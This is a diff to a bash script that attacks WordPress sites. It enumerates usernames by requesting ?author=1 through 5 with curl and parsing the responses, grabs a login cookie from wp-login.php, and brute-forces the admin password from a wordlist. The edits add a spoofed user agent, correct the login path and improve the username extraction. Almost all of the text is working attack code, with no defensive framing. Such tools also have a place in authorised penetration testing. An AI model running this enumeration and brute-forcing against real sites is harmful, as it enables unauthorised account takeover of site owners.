@@ -34,7 +34,7 @@ user_enum(){
 	echo "[+] Username or nickname enumeration"
 	for i in {1..5} 
 	do
-		curl -s -L -i $WP_URL/?author=$i | grep -E -o "\" title=\"View all posts by [a-sz0-9A-Z\-\.]*.*\" |Location:.*" | sed 's/\// /g' | cut -f6 -d ' ' | sed 's/\"//g' | grep -v "^$"
+		curl -s -A "$USER_AGENT" -L -i $WP_URL/?author=$i | grep -E -o "\" title=\"View all posts by [a-sz0-9A-Z\-\.]*.*\" |Location:.*" | sed 's/\// /g' | grep -o "author .*" | sed 's/author //g' | sed 's/\"//g' | grep -v "^$"
 	done
 	exit
 }
@@ -65,7 +65,7 @@ else
 fi
 
 # Get cookie
-curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login > /dev/null
+curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $WP_URL/wp-login.php > /dev/null
 
 # Bruteforce
 echo "[+] Bruteforcing user [$WP_ADMIN]"
@@ -79,5 +79,5 @@ cat "$WP_PASSWORD" | while read line;
 	done
 
 # Remove cookie
-rm "$COOKIE_PATH" 2> /dev/null
 
+rm "$COOKIE_PATH" 2> /dev/null
